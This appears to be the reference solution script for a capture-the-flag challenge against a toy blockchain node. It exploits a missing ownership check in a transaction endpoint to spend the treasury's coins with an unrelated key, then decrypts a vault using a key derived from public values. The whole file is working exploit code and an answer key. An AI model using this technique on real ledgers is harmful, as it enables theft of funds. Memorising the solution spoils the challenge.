#!/usr/bin/env node
// GHOST LEDGER — reference solution.
//
// 1. Recon the live node for genesisHash + treasury address/balance (public API).
// 2. Exploit /api/tx/v2 (the leaked hotfix's ownership-check gap) to spend the
//    treasury's UTXO into a self-generated address — no treasury private key needed.
// 3. Wait for the sweep to be mined.
// 4. Derive the AES-256-GCM key from SHA256(genesisHash + treasuryAddress) — the
//    exact formula referenced in the leaked patch notes — and decrypt the vault.

import { createHash, createDecipheriv } from "node:crypto";
import {
  generateKeyPair,
  encodeAddress,
  bytesToHex,
  publicKeyFromPrivate,
  buildTransaction,
} from "@sgk/core";

const NODE_URL = process.env.GL_NODE_URL ?? "http://localhost:8600";

async function main() {
  console.log("[*] Recon...");
  const info = await fetch(`${NODE_URL}/api/blockchain/info`).then((r) => r.json());
  const briefing = await fetch(`${NODE_URL}/api/briefing`).then((r) => r.json());
  console.log(`    genesisHash      = ${info.genesisHash}`);
  console.log(`    treasuryAddress  = ${briefing.treasuryAddress}`);
  console.log(`    treasuryAmount   = ${briefing.treasuryAmount}`);

  const treasuryInfo = await fetch(`${NODE_URL}/api/address/${briefing.treasuryAddress}`).then((r) => r.json());
  console.log(`[*] Treasury UTXOs: ${treasuryInfo.utxos.length}`);

  console.log("[*] Generating our own keypair (we do NOT have the treasury's private key)...");
  const attacker = generateKeyPair();
  const attackerAddress = encodeAddress(attacker.publicKey, "testnet");
  console.log(`    our address = ${attackerAddress}`);

  console.log("[*] Forging a transaction: sign with OUR key, but reference the TREASURY's UTXOs...");
  // buildTransaction() signs correctly with our own key — the forgery is that
  // we're allowed to reference someone else's UTXO at all, which the
  // signature check alone can't catch.
  const tx = buildTransaction({
    inputsToSpend: treasuryInfo.utxos.map((u) => ({
      txId: u.txId,
      outputIndex: u.outputIndex,
      amount: BigInt(u.amount),
      address: briefing.treasuryAddress,
    })),
    outputs: [{ amount: BigInt(briefing.treasuryAmount), address: attackerAddress }],
    privateKey: attacker.privateKey,
    publicKey: attacker.publicKey,
  });
  const wireTx = { ...tx, outputs: tx.outputs.map((o) => ({ ...o, amount: o.amount.toString() })) };

  console.log("[*] Submitting to /api/tx/v2 (the leaked fast path)...");
  const submitRes = await fetch(`${NODE_URL}/api/tx/v2`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(wireTx),
  });
  const submitData = await submitRes.json();
  if (!submitRes.ok) throw new Error(`v2 submit failed: ${JSON.stringify(submitData)}`);
  console.log(`    accepted: txId ${submitData.txId}`);

  console.log("[*] Waiting for the sweep to be mined...");
  let balance = 0n;
  for (let i = 0; i < 30; i++) {
    await new Promise((r) => setTimeout(r, 2000));
    const addrInfo = await fetch(`${NODE_URL}/api/address/${attackerAddress}`).then((r) => r.json());
    balance = BigInt(addrInfo.balance);
    process.stdout.write(`\r    balance: ${balance}   `);
    if (balance >= BigInt(briefing.treasuryAmount)) break;
  }
  console.log();
  if (balance < BigInt(briefing.treasuryAmount)) throw new Error("sweep did not confirm in time");
  console.log("[+] Treasury fully drained into our address.");

  console.log("[*] Unlocking the vault...");
  const vaultRes = await fetch(`${NODE_URL}/api/vault/unlock`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ address: attackerAddress }),
  });
  const vaultData = await vaultRes.json();
  if (!vaultRes.ok) throw new Error(`vault unlock failed: ${JSON.stringify(vaultData)}`);
  console.log(`    ciphertext: ${vaultData.ciphertext.slice(0, 32)}...`);

  console.log("[*] Deriving AES key = SHA256(genesisHash + treasuryAddress) and decrypting...");
  const key = createHash("sha256").update(info.genesisHash + briefing.treasuryAddress).digest();
  const blob = Buffer.from(vaultData.ciphertext, "hex");
  const iv = blob.subarray(0, 12);
  const authTag = blob.subarray(12, 28);
  const ciphertext = blob.subarray(28);

  const decipher = createDecipheriv("aes-256-gcm", key, iv);
  decipher.setAuthTag(authTag);
  const flag = Buffer.concat([decipher.update(ciphertext), decipher.final()]).toString("utf-8");

  console.log("\n=================================");
  console.log(`FLAG: ${flag}`);
  console.log("=================================");
}

main().catch((err) => {
  console.error("[!] Exploit failed:", err.message);
  process.exit(1);
});
